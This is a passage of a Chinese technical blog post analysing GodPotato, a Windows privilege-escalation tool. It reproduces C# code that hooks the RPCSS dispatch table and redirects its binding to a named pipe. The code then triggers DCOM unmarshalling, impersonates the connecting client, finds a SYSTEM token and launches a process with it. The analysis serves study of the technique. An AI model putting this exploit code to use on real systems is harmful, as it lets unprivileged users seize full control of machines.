class="hljs-number">7</span>)<br>&#123;<br>    delegateFun7 df7 = newOrcbRPC.fun7;<br>    useProtseqDelegate = df7;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (UseProtseqFunctionParamCount == <span class="hljs-number">8</span>)<br>&#123;<br>    delegateFun8 df8 = newOrcbRPC.fun8;<br>    useProtseqDelegate = df8;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (UseProtseqFunctionParamCount == <span class="hljs-number">9</span>)<br>&#123;<br>    delegateFun9 df9 = newOrcbRPC.fun9;<br>    useProtseqDelegate = df9;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (UseProtseqFunctionParamCount == <span class="hljs-number">10</span>)<br>&#123;<br>    delegateFun10 df10 = newOrcbRPC.fun10;<br>    useProtseqDelegate = df10;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (UseProtseqFunctionParamCount == <span class="hljs-number">11</span>)<br>&#123;<br>    delegateFun11 df11 = newOrcbRPC.fun11;<br>    useProtseqDelegate = df11;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (UseProtseqFunctionParamCount == <span class="hljs-number">12</span>)<br>&#123;<br>    delegateFun12 df12 = newOrcbRPC.fun12;<br>    useProtseqDelegate = df12;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (UseProtseqFunctionParamCount == <span class="hljs-number">13</span>)<br>&#123;<br>    delegateFun13 df13 = newOrcbRPC.fun13;<br>    useProtseqDelegate = df13;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (UseProtseqFunctionParamCount == <span class="hljs-number">14</span>)<br>&#123;<br>    delegateFun14 df14 = newOrcbRPC.fun14;<br>    useProtseqDelegate = df14;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> Exception(<span class="hljs-string">$&quot;UseProtseqFunctionParamCount == $<span class="hljs-subst">&#123;UseProtseqFunctionParamCount&#125;</span>&quot;</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure>
+<p></p>
+<h4 id="执行执行-hook"><a class="markdownIt-Anchor" href="#执行执行-hook"></a> 执行（执行 hook）</h4>
+<p>这一步就是将我们实现的代理函数写入目标函数实现 hook，将指向 RPC 调度表的指针修改为自定义函数的指针。</p>
+<p>此处使用到了 <code>C#</code> 中的委托概念，委托可以引用一个或多个函数。<code>GetFunctionPointerForDelegate</code> 函数用于将委托转换为函数指针，<code>useProtseqDelegate</code> 是一个委托变量，也就是准备阶段根据参数数量指定的代理函数。</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs C#"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">HookRPC</span>()</span><br>&#123;<br>    <span class="hljs-built_in">uint</span> old;<br>    VirtualProtect(DispatchTablePtr, (<span class="hljs-built_in">uint</span>)(IntPtr.Size * dispatchTable.Length), <span class="hljs-number">0x04</span>, <span class="hljs-keyword">out</span> old);<br>    Marshal.WriteIntPtr(DispatchTablePtr, Marshal.GetFunctionPointerForDelegate(useProtseqDelegate));<br>    IsHook = <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>关于代理函数 <code>userProtseqDelegate</code> 函数，可以大致看下，最后都调用的 fun 函数，使用的都是最后两个变量，参考 <code>_UseProtseq</code> 这两个变量是 <code>ppsaNewBindings</code> 和 <code>ppsaSecurity</code>。</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-function"><span class="hljs-keyword">public</span>  <span class="hljs-built_in">int</span> <span class="hljs-title">fun4</span>(<span class="hljs-params">IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> fun(p2, p3);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span>  <span class="hljs-built_in">int</span> <span class="hljs-title">fun5</span>(<span class="hljs-params">IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> fun(p3, p4);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span>  <span class="hljs-built_in">int</span> <span class="hljs-title">fun6</span>(<span class="hljs-params">IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> fun(p4, p5);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span>  <span class="hljs-built_in">int</span> <span class="hljs-title">fun7</span>(<span class="hljs-params">IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> fun(p5, p6);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span>  <span class="hljs-built_in">int</span> <span class="hljs-title">fun8</span>(<span class="hljs-params">IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> fun(p6, p7);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span>  <span class="hljs-built_in">int</span> <span class="hljs-title">fun9</span>(<span class="hljs-params">IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> fun(p7, p8);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span>  <span class="hljs-built_in">int</span> <span class="hljs-title">fun10</span>(<span class="hljs-params">IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> fun(p8, p9);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span>  <span class="hljs-built_in">int</span> <span class="hljs-title">fun11</span>(<span class="hljs-params">IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9, IntPtr p10</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> fun(p9, p10);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span>  <span class="hljs-built_in">int</span> <span class="hljs-title">fun12</span>(<span class="hljs-params">IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9, IntPtr p10, IntPtr p11</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> fun(p10, p11);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span>  <span class="hljs-built_in">int</span> <span class="hljs-title">fun13</span>(<span class="hljs-params">IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9, IntPtr p10, IntPtr p11, IntPtr p12</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> fun(p11, p12);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span>  <span class="hljs-built_in">int</span> <span class="hljs-title">fun14</span>(<span class="hljs-params">IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9, IntPtr p10, IntPtr p11, IntPtr p12, IntPtr p13</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> fun(p12, p13);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p><strong>fun 函数</strong></p>
+<p>也就是我们自己实现的 <code>_UseProtseq</code> 函数的代码如下所示，主要操作就是定义了一个字符串数组 <code>endpoints</code>，用于重定向命名管道的通信，然后将此字符串数组写入为进程新分配的内存中。</p>
+<p><code>godPotatoContext.clientPipe</code> 是一个特定的字符串，定义了一个命名管道的路径，当 <code>RPCSS</code> 调用 hook 后的 RPC 函数，就会修改 RPC 服务的绑定设置为指定的命名管道路径，从而让 <code>RPCSS</code> 连接进这个命名管道中，为后续的身份令牌模拟操作奠定基础。</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> <span class="hljs-title">fun</span>(<span class="hljs-params">IntPtr ppdsaNewBindings, IntPtr ppdsaNewSecurity</span>)</span><br>&#123;<br>    <span class="hljs-built_in">string</span>[] endpoints = &#123; godPotatoContext.clientPipe, <span class="hljs-string">&quot;ncacn_ip_tcp:fuck you !&quot;</span> &#125;;<br><br>    <span class="hljs-built_in">int</span> entrieSize = <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; endpoints.Length; i++)<br>    &#123;<br>        entrieSize += endpoints[i].Length;<br>        entrieSize++;<br>    &#125;<br><br>    <span class="hljs-built_in">int</span> memroySize = entrieSize * <span class="hljs-number">2</span> + <span class="hljs-number">10</span>;<br><br>    IntPtr pdsaNewBindings = Marshal.AllocHGlobal(memroySize);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; memroySize; i++)<br>    &#123;<br>        Marshal.WriteByte(pdsaNewBindings, i, <span class="hljs-number">0x00</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">int</span> offset = <span class="hljs-number">0</span>;<br><br>    Marshal.WriteInt16(pdsaNewBindings, offset, (<span class="hljs-built_in">short</span>)entrieSize);<br>    offset += <span class="hljs-number">2</span>;<br>    Marshal.WriteInt16(pdsaNewBindings, offset, (<span class="hljs-built_in">short</span>)(entrieSize - <span class="hljs-number">2</span>));<br>    offset += <span class="hljs-number">2</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; endpoints.Length; i++)<br>    &#123;<br>        <span class="hljs-built_in">string</span> endpoint = endpoints[i];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> j = <span class="hljs-number">0</span>; j &lt; endpoint.Length; j++)<br>        &#123;<br>            Marshal.WriteInt16(pdsaNewBindings, offset, (<span class="hljs-built_in">short</span>)endpoint[j]);<br>            offset += <span class="hljs-number">2</span>;<br>        &#125;<br>        offset += <span class="hljs-number">2</span>;<br>    &#125;<br>    Marshal.WriteIntPtr(ppdsaNewBindings, pdsaNewBindings);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>到此，所有的准备工作都进行完成。下一步就是触发我们自定义的 <code>_UseProtseq</code>。</p>
+<h4 id="提权创建高权限"><a class="markdownIt-Anchor" href="#提权创建高权限"></a> 提权（创建高权限）</h4>
+<p>前文已经提到了，当 <code>RPCSS</code> 发起调用，就会执行到 Hook 的 <code>_UseProtseq</code>，就会修改 RPC 服务的绑定设置为指定的命名管道路径，从而让 <code>RPCSS</code> 连接进这个命名管道中。</p>
+<p><strong>1. 创建一个命名管道</strong></p>
+<p>在<code>GodPotatoContext</code>类中定义了一个<code>PipeServer</code>函数，用于创建并操纵命名管道。</p>
+<p><code>PipeServer</code>函数里，首先使用<code>CreateNamedPipe</code>函数创建一个命名管道，然后调用<code>ConnectNamePipe</code>函数监听命名管道的连接</p>
+<p>当客户端连接进来后调用<code>ImpersonateNamedPipeClient</code>函数来模拟客户端的身份，并检查当前进程的模拟级别是否不足<code>identification</code>。如果是，则调用<code>RevertToSelf</code>函数结束模拟并恢复至模拟前的身份</p>
+<p>在Windows中，模拟级别定义了一个线程可以执行的操作类型，级别从低都高依次是：<code>Anonymous</code>、<code>Identification</code>、<code>Impersonation</code>、<code>Delegation</code></p>
+<ul>
+<li><code>Anonymous</code>(匿名)：无法获取客户端的任何信息</li>
+<li><code>Identification</code>(标识)：允许获取客户端的有关信息,但无法模拟客户端的身份来执行代码</li>
+<li><code>Impersonation</code>(模拟)：允许模拟客户端的身份来执行代码，但仅限于服务器本地</li>
+<li><code>Delegation</code>(委派)：允许模拟客户端的身份在与域上任何计算机执行代码，所谓的“域委派攻击”就是基于此类机制来实现的</li>
+</ul>
+<p><strong>2. 创建 COM 对象</strong></p>
+<p>创建 COM 对象，同时利用该 COM 对象创建伪装 COM，修改其连接的方式和协议。这一步的目的是触发 Hook 函数，让客户端管道（RPCSS）可以连接成功，然后执行 <code>ImpersonateNamedPipeClient</code> 操作。</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">string</span> binding = <span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> <span class="hljs-keyword">static</span> TowerProtocol towerProtocol = TowerProtocol.EPM_PROTOCOL_TCP;<br></code></pre></td></tr></table></figure>
+<p>创建 COM 对象</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">GodPotatoUnmarshalTrigger</span>(<span class="hljs-params">GodPotatoContext godPotatoContext</span>)</span> &#123;<br>    <span class="hljs-keyword">this</span>.godPotatoContext = godPotatoContext;<br>    <span class="hljs-keyword">if</span> (!godPotatoContext.IsStart)<br>    &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> Exception(<span class="hljs-string">&quot;GodPotatoContext was not initialized&quot;</span>);<br>    &#125;<br>    pIUnknown = Marshal.GetIUnknownForObject(fakeObject);<br>    NativeMethods.CreateBindCtx(<span class="hljs-number">0</span>, <span class="hljs-keyword">out</span> bindCtx);<br>    NativeMethods.CreateObjrefMoniker(pIUnknown, <span class="hljs-keyword">out</span> moniker);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>触发 RPCSS</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> <span class="hljs-title">Trigger</span>()</span> &#123;<br><br>    <span class="hljs-built_in">string</span> ppszDisplayName;<br>    moniker.GetDisplayName(bindCtx, <span class="hljs-literal">null</span>, <span class="hljs-keyword">out</span> ppszDisplayName);<br>    ppszDisplayName = ppszDisplayName.Replace(<span class="hljs-string">&quot;objref:&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).Replace(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">byte</span>[] objrefBytes = Convert.FromBase64String(ppszDisplayName);<br><br>    ObjRef tmpObjRef = <span class="hljs-keyword">new</span> ObjRef(objrefBytes);<br><br>    godPotatoContext.ConsoleWriter.WriteLine(<span class="hljs-string">$&quot;[*] DCOM obj GUID: <span class="hljs-subst">&#123;tmpObjRef.Guid&#125;</span>&quot;</span>);<br>    godPotatoContext.ConsoleWriter.WriteLine(<span class="hljs-string">$&quot;[*] DCOM obj IPID: <span class="hljs-subst">&#123;tmpObjRef.StandardObjRef.IPID&#125;</span>&quot;</span>);<br>    godPotatoContext.ConsoleWriter.WriteLine(<span class="hljs-string">&quot;[*] DCOM obj OXID: 0x&#123;0:x&#125;&quot;</span>, tmpObjRef.StandardObjRef.OXID);<br>    godPotatoContext.ConsoleWriter.WriteLine(<span class="hljs-string">&quot;[*] DCOM obj OID: 0x&#123;0:x&#125;&quot;</span>, tmpObjRef.StandardObjRef.OID);<br>    godPotatoContext.ConsoleWriter.WriteLine(<span class="hljs-string">&quot;[*] DCOM obj Flags: 0x&#123;0:x&#125;&quot;</span>, tmpObjRef.StandardObjRef.Flags);<br>    godPotatoContext.ConsoleWriter.WriteLine(<span class="hljs-string">&quot;[*] DCOM obj PublicRefs: 0x&#123;0:x&#125;&quot;</span>, tmpObjRef.StandardObjRef.PublicRefs);<br><br>    ObjRef objRef = <span class="hljs-keyword">new</span> ObjRef(IID_IUnknown,<br>          <span class="hljs-keyword">new</span> ObjRef.Standard(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, tmpObjRef.StandardObjRef.OXID, tmpObjRef.StandardObjRef.OID, tmpObjRef.StandardObjRef.IPID,<br>            <span class="hljs-keyword">new</span> ObjRef.DualStringArray(<span class="hljs-keyword">new</span> ObjRef.StringBinding(towerProtocol, binding), <span class="hljs-keyword">new</span> ObjRef.SecurityBinding(<span class="hljs-number">0xa</span>, <span class="hljs-number">0xffff</span>, <span class="hljs-literal">null</span>))));<br>    <span class="hljs-built_in">byte</span>[] data = objRef.GetBytes();<br><br>    godPotatoContext.ConsoleWriter.WriteLine(<span class="hljs-string">$&quot;[*] Marshal Object bytes len: <span class="hljs-subst">&#123;data.Length&#125;</span>&quot;</span>);<br>    <br>    IntPtr ppv;<br><br>    godPotatoContext.ConsoleWriter.WriteLine(<span class="hljs-string">$&quot;[*] UnMarshal Object&quot;</span>);<br>    <span class="hljs-keyword">return</span> UnmarshalDCOM.UnmarshalObject(data,<span class="hljs-keyword">out</span> ppv);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>如下图所示，RPCSS 将发起的 COM 对象操作连接到了管道 <code>GodPotato\pipe\epmapper</code>，这一步操作是在自定义的 Hook 内完成的。</p>
+<img src="/2025/01/09/A_OS/Windows/RPC/%E3%80%90RPC%E3%80%91GodPotato%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20250109185716896.png" srcset="/img/loading.gif" lazyload class title="RPCSS 连接到服务端">
+<p><strong>3. 枚举进程，获取权限</strong></p>
+<p>调用<code>ListProcessTokens</code>函数检查每个句柄的PID，来确定当前进程的句柄并获取其令牌，然后判断此令牌是否拥有<code>SYSTEM</code>权限；最后通过此令牌创建一个新的<code>WindowsIdentity</code>实例，后续可通过此实例来使用令牌创建高权限的进程。</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-keyword">if</span> (ImpersonateNamedPipeClient(pipeServerHandle))<br>&#123;<br>    systemIdentity = WindowsIdentity.GetCurrent();<br>    <span class="hljs-keyword">if</span> (systemIdentity.ImpersonationLevel &lt;= TokenImpersonationLevel.Identification)<br>    &#123;<br>        RevertToSelf();<br>    &#125;<br><br>    ConsoleWriter.WriteLine(<span class="hljs-string">&quot;[*] CurrentUser: &quot;</span> + systemIdentity.Name);<br>    ConsoleWriter.WriteLine(<span class="hljs-string">&quot;[*] CurrentsImpersonationLevel: &quot;</span> + systemIdentity.ImpersonationLevel);<br><br>    ConsoleWriter.WriteLine(<span class="hljs-string">&quot;[*] Start Search System Token&quot;</span>);<br><br>    <span class="hljs-built_in">bool</span> isFindSystemToken = <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">if</span> (systemIdentity.ImpersonationLevel &gt;= TokenImpersonationLevel.Impersonation)<br>    &#123;<br>        SharpToken.TokenuUils.ListProcessTokens(<span class="hljs-number">-1</span>, processToken =&gt; &#123;<br>            <span class="hljs-keyword">if</span> (processToken.SID == <span class="hljs-string">&quot;S-1-5-18&quot;</span> &amp;&amp; processToken.ImpersonationLevel &gt;= TokenImpersonationLevel.Impersonation &amp;&amp; processToken.IntegrityLevel &gt;= SharpToken.IntegrityLevel.SystemIntegrity)<br>            &#123;<br>                systemIdentity = <span class="hljs-keyword">new</span> WindowsIdentity(processToken.TokenHandle);<br>                ConsoleWriter.WriteLine(<span class="hljs-string">&quot;[*] PID : &#123;0&#125; Token:0x&#123;1:x&#125;  User: &#123;2&#125; ImpersonationLevel: &#123;3&#125;&quot;</span>, processToken.TargetProcessId, processToken.TargetProcessToken, processToken.UserName, processToken.ImpersonationLevel);<br>                isFindSystemToken = <span class="hljs-literal">true</span>;<br>                processToken.Close();<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            processToken.Close();<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;);<br>    &#125;<br><br>    ConsoleWriter.WriteLine(<span class="hljs-string">&quot;[*] Find System Token : &quot;</span> + isFindSystemToken);<br><br>    RevertToSelf();<br>&#125;<br></code></pre></td></tr></table></figure>
+<h4 id="利用创建进程"><a class="markdownIt-Anchor" href="#利用创建进程"></a> 利用（创建进程）</h4>
+<p>最后就是通过上一步创建的 Token 创建进程了</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs C#">WindowsIdentity systemIdentity = godPotatoContext.GetToken();<br><span class="hljs-keyword">if</span> (systemIdentity != <span class="hljs-literal">null</span>)<br>&#123;<br>    ConsoleWriter.WriteLine(<span class="hljs-string">&quot;[*] CurrentUser: &quot;</span> + systemIdentity.Name);<br>    TokenuUils.createProcessReadOut(ConsoleWriter, systemIdentity.Token, potatoArgs.cmd);<br><br>&#125;<br></code></pre></td></tr></table></figure>
+<p></p>
+<p></p>
+<p></p>
+<p></p>
+<p></p>
+
+                
+              </div>
+            
+            <hr>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/A-OS/" class="category-chain-item">A_OS</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/A-OS/Windows/" class="category-chain-item">Windows</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/A-OS/Windows/RPC/" class="category-chain-item">RPC</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%BC%8F%E6%B4%9E/" class="print-no-link">#漏洞</a>
+      
+        <a href="/tags/RPC/" class="print-no-link">#RPC</a>
+      
+        <a href="/tags/DCOM/" class="print-no-link">#DCOM</a>
+      
+        <a href="/tags/%E6%8F%90%E6%9D%83/" class="print-no-link">#提权</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>【RPC】GodPotato原理分析</div>
+      <div>https://hodlyounger.github.io/2025/01/09/A_OS/Windows/RPC/【RPC】GodPotato原理分析/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>mingming</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年1月9日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/" rel="external nofollow noopener noreferrer">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/01/07/A_OS/Windows/%E6%89%B9%E5%A4%84%E7%90%86/%E3%80%90%E6%89%B9%E5%A4%84%E7%90%86%E3%80%91%E6%89%B9%E5%A4%84%E7%90%86%E6%A8%A1%E6%9D%BF/" title="【批处理】批处理模板">
+                        <span class="hidden-mobile">【批处理】批处理模板</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="external nofollow noopener noreferrer"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="external nofollow noopener noreferrer"><span>Fluid</span></a> 
